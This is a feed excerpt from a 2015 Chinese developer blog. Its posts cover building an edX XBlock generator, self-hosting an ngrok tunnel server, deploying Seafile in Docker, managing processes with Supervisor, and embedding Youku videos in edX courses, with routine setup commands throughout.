&lt;p&gt;&lt;code&gt;当我们陷入重复劳动的时候，可能就是合适的时机来考虑如何自动化这项工作了，以便能省下时间来喝咖啡。而且我们知道，重复乏味的劳动中，人是容易出错的，而机器不知疲倦，所以偷懒是程序员的美德&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;思路&lt;/h1&gt;
&lt;p&gt;我的设想里，xblock插件生成器做的是这样的工作：开发者将项目名，所需存储字段，字段属性，，项目依赖的外部静态文件等写入config.json配置文件（或者config.yml/config.py），而后自动生成xblock，而后只需要做些微调以及在指定位置加入自己的业务代码,一个插件便可用了。&lt;/p&gt;
&lt;p&gt;这里的主要工作是将琐碎的工作自动化，然后提供一个通用的模板，给出大多的备选功能（属性或函数，默认以注释掉的方式存在于生成的xblock中），尽量按照现有的xblock组件布局方式，现有的xblock组件可以参考&lt;a href="https://github.com/edx/edx-platform/wiki/List-of-XBlocks"&gt;这里&lt;/a&gt;，这样一来，熟练的开发者不需要参考文档，仅需要取消注释，做些微调，就足以快速地完成工作，没错，眼尖的你可能已经看出来了，这是ROR中致力于鼓吹的&lt;code&gt;convention over configuration&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;此外，说到设计原则，关于灵活性部分，我喜欢&lt;code&gt;Open Closed Principle&lt;/code&gt;原则（也就是著名开放封闭原则），对扩展开放，对修改关闭。xblock满足这点,我很喜欢&lt;/p&gt;
&lt;h1&gt;设计原则&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Open Closed Principle（开放封闭原则）&lt;/li&gt;
&lt;li&gt;convention over configuration （约定优于配置）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;技术细节&lt;/h1&gt;
&lt;p&gt;剩下的就是技术细节的工作了。&lt;/p&gt;
&lt;p&gt;我最初想以&lt;a href="https://github.com/mitsuhiko/jinja2"&gt;jinja2&lt;/a&gt;模板为基础,
我们知道ansible之类的大型项目也够选择了jinja2，这的确是个优秀的模板引擎。而后发现了&lt;a href="https://github.com/audreyr/cookiecutter"&gt;cookiecutter&lt;/a&gt;,这个工具进一步简化了工作，于是决定基于它来写xblock插件生成器，这样一来根据配置文件来自动生成文件名的问题都解决了&lt;/p&gt;
&lt;h1&gt;遇到的问题&lt;/h1&gt;
&lt;p&gt;这里存在一个很有意思的问题，它和正则相关，cookiecutter用的是标准的jinja2模板，jinja2模版的语法和django相似，而xblock中的模板我用的是django而不是mako，这样一来就导致xblock中有一部分&lt;code&gt;{{var}}&lt;/code&gt;，我们是想等xblock来渲染，结果却被cookiecutter先渲染了。这个问题可以通过更改jinja2语法风格来解决，或是通过使用mako模板来解决。我是quick and dirty的方式解决的。用到了正则&lt;/p&gt;
&lt;h1&gt;此类问题&lt;/h1&gt;
&lt;p&gt;此类问题，或者说代码生成器问题(generator),十分吸引人,它本质上是字符处理问题（我觉得&lt;code&gt;宏&lt;/code&gt;的本质也是这个），这类问题的极致形态是写一个parser，而一般形态是使用正则，当然使用模板往往是个捷径。&lt;/p&gt;
&lt;h1&gt;xblock市场的构想&lt;/h1&gt;
&lt;p&gt;个人而言，我很看好edX，我一直相信xblock本身足以形成插件市场，我觉得以此作为出发点，构建一个咨询/定制/服务型的公司是很有意思的，我喜欢《黑客与画家》第六章提到的观点：&lt;code&gt;财富就是创造人们需要的东西&lt;/code&gt;，我们可以看到即便是国内，这个需求也已经越来越膨胀却没有找到出口。我们今天可以看到，edx这个项目本身是很诱人的，许多教育业内人士与公司都跃跃欲试，而edx的技术门槛确实个拦路虎，那么提供edx相关的技术/开发咨询/培训，提供定制化的服务（插件定制），降低开发的门槛等等，是许多企业客户期待的，当然也是对推广edx本身很有价值的，我的兴趣点之一可能在这里吧，&lt;code&gt;让技术变得易用使用，能方便地用来应对现实问题&lt;/code&gt;，我此前折腾docker，折腾云服务，折腾LTI，此次写的xblock生成器，可能都是受此观念的驱动吧&lt;/p&gt;
&lt;p&gt;有了xblock插件生成器，我们尤其适合做一些为课程深度定制的组件，快速完成插件的基础上，又可以据此作为模板生成其他组件。&lt;/p&gt;
&lt;p&gt;前段时间给公司展示了我业余时间折腾的d3组件,&lt;a href="http://jaredforsyth.com/treed/"&gt;treed&lt;/a&gt;,十分适合结合到edx中，作为呈现知识的方式，类似思维导图 ,d3的案例千千万:&lt;a href="http://bl.ocks.org/mbostock"&gt;bl.ocks.org&lt;/a&gt;，如果能将此领域与教育领域结合,首先市场部势必会很兴奋，有了xblock插件生产器，将d3组件移植到xblock就变得十分迅速。而这些还仅仅是d3。类似的组件还有许多，这里的核心想法是，&lt;code&gt;通过xblock这种插件机制，我们可以将其他领域的成果（好比数据可视化），轻易得整合到教育中，所谓学科融合&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如此一来，结合具体学科，快速打造易用性的组件就变得容易，易用性很可能造成高度的定制化，由此带来通用性的损失，而有了插件生成器，大量打造定制化的插件，时间成本也不至于太高，成本一旦降低，作为商业性的服务就容易被接受。&lt;/p&gt;
&lt;p&gt;该组件可能暂时不会开源，想先进一步优化它，可能的话想以此试水xblock市场&lt;/p&gt;
&lt;h1&gt;花絮&lt;/h1&gt;
&lt;p&gt;在写完大体框架的时候，打了个 v0.1 tag，觉得后续的改良还很多，出于谦虚的姿态，版本号慢慢来，而后又花了一个周末的下午，觉得妈蛋好像主要的事都做完了，直接打了个v1.0的tag。而后顺便把将MTV中的T（Template）换成了mako，于是mako/v1.0也出来了&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 15 Sep 2015 00:00:00 +0000</pubDate><guid>tag:,2015-09-15:xblock-generator-and-others.html</guid><category>edx</category></item><item><title>搭建ngrok服务（内网穿透）</title><link>/build-ngrok-server.html</link><description>&lt;p&gt;由于众所周知的原因，我们无法使用ngrok.com&lt;/p&gt;
&lt;p&gt;国内有一个基于ngrok的网络服务：&lt;a href="tunnel.mobi"&gt;tunnel.mobi&lt;/a&gt;，不过时常不稳定。所以想自己搭建一个&lt;/p&gt;
&lt;h1&gt;搭建&lt;/h1&gt;
&lt;p&gt;环境：ubuntu14.04&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#安装依赖&lt;/span&gt;
sudo apt-get install build-essential golang mercurial git&lt;span class="sb"&gt;`&lt;/span&gt;

&lt;span class="c1"&gt;#获取ngrok&lt;/span&gt;
git clone https://github.com/inconshreveable/ngrok.git ngrok
&lt;span class="nb"&gt;cd&lt;/span&gt; ngrok

&lt;span class="c1"&gt;#生成并替换默认的证书&lt;/span&gt;
&lt;span class="nv"&gt;NGROK_DOMAIN&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;YOUR_DOMAIN&amp;quot;&lt;/span&gt;
openssl genrsa -out base.key 2048
openssl req -new -x509 -nodes -key base.key -days &lt;span class="m"&gt;10000&lt;/span&gt; -subj &lt;span class="s2"&gt;&amp;quot;/CN=&lt;/span&gt;&lt;span class="nv"&gt;$NGROK_DOMAIN&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; -out base.pem
openssl genrsa -out server.key 2048
openssl req -new -key server.key -subj &lt;span class="s2"&gt;&amp;quot;/CN=&lt;/span&gt;&lt;span class="nv"&gt;$NGROK_DOMAIN&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; -out server.csr
openssl x509 -req -in server.csr -CA base.pem -CAkey base.key -CAcreateserial -days &lt;span class="m"&gt;10000&lt;/span&gt; -out server.crt
cp base.pem assets/client/tls/ngrokroot.crt
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;开始编译&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;sudo make release-server release-client&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;编译完成后bin目录下将生产ngrokd和ngrok&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;编译window版本客户端：&lt;/h3&gt;
&lt;p&gt;GOOS=windows GOARCH=386&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo &lt;span class="nv"&gt;GOOS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;windows &lt;span class="nv"&gt;GOARCH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;386&lt;/span&gt;  make  release-client
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h3&gt;编译mac版本客户端：&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo &lt;span class="nv"&gt;GOOS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;darwin &lt;span class="nv"&gt;GOARCH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;amd64 make  release-client
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后都能在bin目录下找到&lt;/p&gt;
&lt;h1&gt;运行服务&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;chmod +x ./bin/ngrokd
sudo ./bin/ngrokd -tlsKey&lt;span class="o"&gt;=&lt;/span&gt;server.key -tlsCrt&lt;span class="o"&gt;=&lt;/span&gt;server.crt -domain&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;YOUR_DOMAIN&amp;quot;&lt;/span&gt; -httpAddr&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:8000&amp;quot;&lt;/span&gt; -httpsAddr&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:443&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;注意&lt;/h1&gt;
&lt;p&gt;客户端必须使用自己编译的ngrok文件&lt;/p&gt;
&lt;h1&gt;设置开机自动启动ngrok服务&lt;/h1&gt;
&lt;p&gt;vim /etc/init.d/ngrok_start:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/path/to/ngrokd -tlsKey&lt;span class="o"&gt;=&lt;/span&gt;/path/to/server.key -tlsCrt&lt;span class="o"&gt;=&lt;/span&gt;/path/to/server.crt -domain&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;findhao.com&amp;quot;&lt;/span&gt; -httpAddr&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:8000&amp;quot;&lt;/span&gt; -httpsAddr&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:443&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;做些设置：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo chmod &lt;span class="m"&gt;755&lt;/span&gt; /etc/init.d/ngrok_start
&lt;span class="nb"&gt;cd&lt;/span&gt; /etc/init.d
sudo update-rc.d ngrok_start defaults 20
&lt;span class="c1"&gt;#卸载启动脚本&lt;/span&gt;
&lt;span class="nb"&gt;cd&lt;/span&gt; /etc/init.d
sudo update-rc.d -f ngrok_start remove
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;设置域名解析&lt;/h1&gt;
&lt;p&gt;把域名解析到VPS上，如果你只需要主机记录@和www，直接设置A记录把他们解析到VPS的IP上，如果需要很多二级域名的话，可以直接把*解析到IP上&lt;/p&gt;
&lt;h1&gt;客户端使用&lt;/h1&gt;
&lt;p&gt;vim ngrok.cfg:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;server_addr: YOUR_DOMAIN:4443
trust_host_root_certs: &lt;span class="nb"&gt;false&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;./ngrok -subdomain wwj -config=ngrok.cfg 8000&lt;/code&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 09 Sep 2015 00:00:00 +0000</pubDate><guid>tag:,2015-09-09:build-ngrok-server.html</guid><category>技术</category></item><item><title>搭建私有文件存储服务</title><link>/build-seafile.html</link><description>&lt;p&gt;公司最近准备搭建私有文件存储服务，主要的需求点在团队协作，文件共享和权限控制，我又有机会冒充系统管理员啦。&lt;/p&gt;
&lt;p&gt;一直对seafile很感兴趣，给L演示后，他也觉得不错，于是开始搭建。&lt;/p&gt;
&lt;p&gt;首选方案当然是用docker。一搜github找到它:&lt;a href="https://github.com/JensErat/docker-seafile"&gt;docker-seafile&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;剩下的就是细节啦。&lt;/p&gt;
&lt;h1&gt;安装seafile&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;安装docker,参考&lt;a href="http://wwj718.github.io/docker-edx-birch-1.html"&gt;我此前的文章&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;docker run：  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  sudo docker run -t -i \
  -p 10001:10001 \
  -p 12001:12001 \
  -p 8001:8000 \
  -p 8080:8080 \
  -p 8082:8082 \
  -v /srv/seafile:/opt/seafile \
  jenserat/seafile -- /bin/bash
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mkdir seafile&amp;amp;cd seafile&lt;/code&gt;，&lt;code&gt;git clone https://github.com/JensErat/docker-seafile.git&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在宿主机里 &lt;code&gt;cd docker-seafile&lt;/code&gt;,&lt;code&gt;./download-seafile.sh&lt;/code&gt; , &lt;code&gt;sudo cp . /srv/seafile -R&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;进入容器：&lt;code&gt;/opt/seafile/seafile-server-4.3.2/setup-seafile.sh&lt;/code&gt;,回答相应问题&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/opt/seafile/seafile-server-latest/seafile.sh start&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/opt/seafile/seafile-server-latest/seahub.sh start&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;exit&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;运行seafile&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;docker run -d &lt;span class="se"&gt;\&lt;/span&gt;
  --name seafile &lt;span class="se"&gt;\&lt;/span&gt;
  -p 10001:10001 &lt;span class="se"&gt;\&lt;/span&gt;
  -p 12001:12001 &lt;span class="se"&gt;\&lt;/span&gt;
  -p 8001:8000 &lt;span class="se"&gt;\&lt;/span&gt;
  -p 8080:8080 &lt;span class="se"&gt;\&lt;/span&gt;
  -p 8082:8082 &lt;span class="se"&gt;\&lt;/span&gt;
  -v /srv/seafile:/opt/seafile &lt;span class="se"&gt;\&lt;/span&gt;
  -e &lt;span class="nv"&gt;autostart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;true&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
  jenserat/seafile
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;开机自启&lt;/h1&gt;
&lt;p&gt;加上&lt;code&gt;--restart=no&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;使用&lt;/h1&gt;
&lt;p&gt;访问ip:8001&lt;/p&gt;
&lt;h1&gt;重新配置&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;进入到容器中
rm -rf /opt/seafile/ccnet
rm -rf  /opt/seafile/seafile-data
/opt/seafile/seafile-server-4.3.2/setup-seafile.sh
/opt/seafile/seafile-server-latest/seafile.sh restart
/opt/seafile/seafile-server-latest/seahub.sh restart
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;定制开发（将其作为文件服务）&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;web api ： &lt;a href="http://manual-cn.seafile.com/develop/web_api.html#file-share-link"&gt;http://manual-cn.seafile.com/develop/web_api.html#file-share-link&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;python api : &lt;a href="http://manual-cn.seafile.com/develop/python_api.html"&gt;http://manual-cn.seafile.com/develop/python_api.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;桌面端以及移动端下载&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://www.seafile.com/download/"&gt;https://www.seafile.com/download/&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;接口调试&lt;/h1&gt;
&lt;p&gt;试了下缩略图功能：&lt;a href="http://manual-cn.seafile.com/develop/web_api.html#get-thumbnail-image"&gt;http://manual-cn.seafile.com/develop/web_api.html#get-thumbnail-image&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;获取token：&lt;code&gt;curl -d "username=MYUSERNAME&amp;amp;password=MYPASSWORD" http://MYSERVER/api2/auth-token/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;获取缩略图：&lt;code&gt;curl -H "Authorization: Token MYTOKEN"   http://MYSERVER/api2/repos/{repo_id}/thumbnail/?p=echarts5.jpeg&amp;amp;size=123 &amp;gt; thumbnail.png&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中repo_id进入具体资料库，从url中可以看到&lt;/p&gt;
&lt;h1&gt;坑记录&lt;/h1&gt;
&lt;p&gt;由于文件服务器搭建在内网，偶尔也有外部访问的需求（主要是文件分类之类的工作，技术负责人/规范制定者们得经常出门在外，这个需求还是挺常见的），所以使用ngrok映射出去，由于文件相关的服务在8082端口，而ngrok只映射web server服务，所以外部可以操作网站，却无法查看/上传/下载文件。这与需求不矛盾: )&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 08 Sep 2015 00:00:00 +0000</pubDate><guid>tag:,2015-09-08:build-seafile.html</guid><category>技术</category></item><item><title>使用Supervisor来管理进程</title><link>/process-control-system-supervisor.html</link><description>&lt;h1&gt;Supervisor是什么&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Supervisor is a client/server system that allows its users to monitor and control a number of processes on UNIX-like operating systems.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Supervisor是用Python实现的一款实用的进程管理工具。Supervisor会帮你把管理的应用程序转成daemon程序，而且可以方便的通过命令开启、关闭、重启进程等操作，而且它管理的进程一旦崩溃会自动重启，这样就可以保证程序执行中断后的情况下有自我修复的功能。&lt;/p&gt;
&lt;h1&gt;安装与配置&lt;/h1&gt;
&lt;p&gt;Supervisor本质上是个python包,安装很简易:&lt;code&gt;sudo pip install supervisor&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;配置文件&lt;/h2&gt;
&lt;p&gt;运行&lt;code&gt;echo_supervisord_conf&lt;/code&gt;，会输出一个模板，修修改改就可用了。
将其写入文件：&lt;code&gt;sudo echo_supervisord_conf &amp;gt; supervisord.conf&lt;/code&gt;&lt;br /&gt;
如果没有root权限，可以将配置文件写在本地，之后用&lt;code&gt;-c&lt;/code&gt;参数来指定配置文件: &lt;code&gt;supervisord -c supervisord.conf&lt;/code&gt;。推荐做法是将配置文件写到&lt;code&gt;/etc/supervisord.conf&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;生成默认配置文件(推荐做法)&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;echo_supervisord_conf &amp;gt; /etc/supervisord.conf
mkdir /etc/supervisord.conf.d
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;每个需要管理的进程分别写在一个文件里面，放在/etc/supervisord.conf.d/目录下，便于管理。修改配置文件,include区段修改为&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[include]
files = /etc/supervisord.conf.d/*.conf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如需要访问web控制界面，inet_http_server区段修改为&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[inet_http_server]
port=0.0.0.0:9001
username=username 
password=password 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;修改后需要supervisorctl reload （载入最新的配置文件，并按新的配置启动、管理所有进程。）&lt;/p&gt;
&lt;h2&gt;开机自启&lt;/h2&gt;
&lt;p&gt;将supervisord加入系统服务,文件：&lt;code&gt;/etc/init.d/supervisord&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;简单的方法是往&lt;code&gt;/etc/rc.local&lt;/code&gt;加入&lt;code&gt;/usr/local/bin/supervisord&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;使用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Supervisord安装完成后有两个可用的命令行&lt;code&gt;supervisor&lt;/code&gt;和&lt;code&gt;supervisorctl&lt;/code&gt;   &lt;/li&gt;
&lt;li&gt;supervisord:初始启动Supervisord，启动、管理配置中设置的进程:
启动supervisord：&lt;code&gt;supervisord -c /etc/supervisord.conf&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;supervisorctl stop programxxx，停止某一个进程(programxxx)，programxxx为[program:programxxx]里配置的值。stop可替换为start/restart/reload&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;edX中（Cypress版本）&lt;/h2&gt;
&lt;h4&gt;Shutdown the lms and cms:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo /edx/bin/supervisorctl  
&amp;gt; stop edxapp: edxapp_worker:
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;See what services are running&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;sudo /edx/bin/supervisorctl status&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;Restarting Services&lt;/h4&gt;
&lt;p&gt;LMS/CMS : &lt;code&gt;sudo /edx/bin/supervisorctl restart edxapp:&lt;/code&gt;&lt;br /&gt;
Workers : &lt;code&gt;sudo /edx/bin/supervisorctl restart edxapp_worker:&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;stop everything except the LMS and CMS&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;sudo /edx/bin/supervisorctl stop discern discern_celery 
  forum ora ora_celery xqueue xqueue_consumer xserver edxapp_worker:&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;edx中相关配置文件&lt;/h3&gt;
&lt;p&gt;搜索&lt;code&gt;sudo find /  -name *supervisord*&lt;/code&gt;。观察发现lms和cms相关的配置文件在&lt;code&gt;/edx/app/supervisor/supervisord.conf&lt;/code&gt; , &lt;code&gt;/edx/app/supervisor/conf.d/*.conf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其中lms的配置文件为&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[program:lms]

command=/edx/app/edxapp/venvs/edxapp/bin/gunicorn -c /edx/app/edxapp/lms_gunicorn.py lms.wsgi

user=www-data
directory=/edx/app/edxapp/edx-platform
environment=PORT=8000,ADDRESS=127.0.0.1,LANG=en_US.UTF-8,DJANGO_SETTINGS_MODULE=lms.envs.aws,SERVICE_VARIANT=&amp;quot;lms&amp;quot;,PATH=&amp;quot;/edx/app/edxapp/venvs/edxapp/bin:/edx/app/edxapp/edx-plat
form/bin:/edx/app/edxapp/.rbenv/bin:/edx/app/edxapp/.rbenv/shims:/edx/app/edxapp/.gem/bin:/edx/app/edxapp/edx-platform/node_modules/.bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&amp;quot;
stdout_logfile=/edx/var/log/supervisor/%(program_name)s-stdout.log
stderr_logfile=/edx/var/log/supervisor/%(program_name)s-stderr.log
killasgroup=true
stopasgroup=true
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://supervisord.org/"&gt;Supervisor: A Process Control System&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://type.so/linux/supervisor-install-and-configure.html"&gt;Supervisor安装及配置&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 06 Sep 2015 00:00:00 +0000</pubDate><guid>tag:,2015-09-06:process-control-system-supervisor.html</guid><category>技术</category></item><item><title>在edx中使用优酷视频服务</title><link>/edx-use-youku.html</link><description>&lt;h1&gt;edx中视频组件&lt;/h1&gt;
&lt;p&gt;edx中的视频组件和youtube耦合得比较紧密，可惜在国内我们与此无缘。&lt;/p&gt;
&lt;p&gt;edx中原生的视频播放器，会捕捉用户观看行为，写入到track log，而这些数据是edx数据可视化的来源，所以如果我们放弃这个视频组件，转而使用其他视频服务商提供的播放器，那么关于视频行为分析就只能自行移植。这是个不小的工作量。&lt;/p&gt;
&lt;p&gt;当然目前数据可视化这一块，默认还未启用，从看得见的层面来说，弃用默认的视频播放器，并不造成实际影响。&lt;/p&gt;
&lt;p&gt;为了使用国内视频流服务，我们需要为edx编写对应的XBlock，提供本地化的视频组件，这也算是本地化绕不开的一个问题吧。&lt;/p&gt;
&lt;p&gt;当然我们也可以搭建自己的视频流服务器（甚至CDN），考虑到时间和成本预算，以及服务的稳定性，选择专业的服务商往往来的更划算。&lt;/p&gt;
&lt;h1&gt;国内的视频服务商&lt;/h1&gt;
&lt;p&gt;一些比较有名的视频服务商包括：优酷，土豆，腾讯云，&lt;a href="http://www.polyv.net/"&gt;保利威视&lt;/a&gt;,&lt;a href="http://www.bokecc.com/"&gt;CC视频&lt;/a&gt;之类的，此外七牛云，又拍云这类云存储也很适合用来存储视频的。&lt;/p&gt;
&lt;p&gt;个人而言,我很喜欢七牛云,良心企业 ^_^&lt;/p&gt;
&lt;p&gt;就在线教育而言，&lt;a href="http://www.polyv.net/"&gt;保利威视&lt;/a&gt;和&lt;a href="http://www.bokecc.com/"&gt;CC视频&lt;/a&gt;针对教育提供了不少实用的功能,值得关注&lt;/p&gt;
&lt;h1&gt;针对优酷的XBlock（&lt;a href="https://github.com/wwj718/youkuXBLock"&gt;youkuXBlock&lt;/a&gt;）&lt;/h1&gt;
&lt;p&gt;我在此要分享的XBlock是针对优酷的&lt;/p&gt;
&lt;p&gt;当然企业级用户可能会更倾向于腾讯云，腾讯云的XBlock这周末估计可以写完（预计会集成到edx国内社区版中），到时候与edx社区版一起发布&lt;/p&gt;
&lt;p&gt;关于优酷的视频服务可以看&lt;a href="http://open.youku.com/"&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;XBlock源代码看这里：&lt;a href="https://github.com/wwj718/youkuXBLock"&gt;youkuXBlock&lt;/a&gt; , 欢迎fork，欢迎pull requests ，欢迎反馈bug&lt;/p&gt;
&lt;p&gt;具体的使用和安装，项目主页有，在此介绍下使用说明&lt;/p&gt;
&lt;h1&gt;使用说明&lt;/h1&gt;
&lt;p&gt;我们假设你已经在edx中装好了相应组件，也做好了相关配置，如果还没有，请参考项目主页:&lt;a href="https://github.com/wwj718/youkuXBLock"&gt;youkuXBlock&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;首先你得有一个优酷账号。&lt;/p&gt;
&lt;p&gt;然后上传视频:&lt;/p&gt;
&lt;p&gt;&lt;img alt="youku1" src="img/edx/youku/youku1.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;上传好之后，获得视频id（vid），稍后要填写到youkuXBlock组件里&lt;/p&gt;
&lt;p&gt;&lt;img alt="youku2" src="img/edx/youku/youku2.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;接下来去优酷开放平台，注册一个应用（有免广告之类的可选功能(付费)）&lt;/p&gt;
&lt;p&gt;&lt;img alt="youku3" src="img/edx/youku/youku3.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;记下client_id,之后要填写到xblock中&lt;/p&gt;
&lt;p&gt;&lt;img alt="youku4" src="img/edx/youku/youku4.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;去studio里填写参数&lt;/p&gt;
&lt;p&gt;&lt;img alt="youku7" src="img/edx/youku/youku7.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;保存发布，大功告成&lt;/p&gt;
&lt;p&gt;&lt;img alt="youku8" src="img/edx/youku/youku8.jpeg" /&gt;&lt;/p&gt;
&lt;h1&gt;定制性&lt;/h1&gt;
&lt;p&gt;优酷的定制性还挺好的，有时间可以深度定制一下：&lt;/p&gt;
&lt;p&gt;&lt;img alt="youku5" src="img/edx/youku/youku5.jpeg" /&gt;
&lt;img alt="youku6" src="img/edx/youku/youku6.jpeg" /&gt;&lt;/p&gt;
&lt;h1&gt;计划&lt;/h1&gt;
&lt;p&gt;优酷免广告的费用并不便宜，我之后可能会针对&lt;a href="http://www.polyv.net/"&gt;保利威视&lt;/a&gt;做更深度的定制，目前对&lt;a href="http://www.polyv.net/"&gt;保利威视&lt;/a&gt;只做了基础版，计划中的功能包括在课程中插入题目，弹幕，数据可视化之类的功能，尽量做到在一个平台内编辑（一体化，在studio中编辑），而不需要用户反复切换操作界面。技术细节可能主要涉及到token，预计业务逻辑多会用js写&lt;/p&gt;
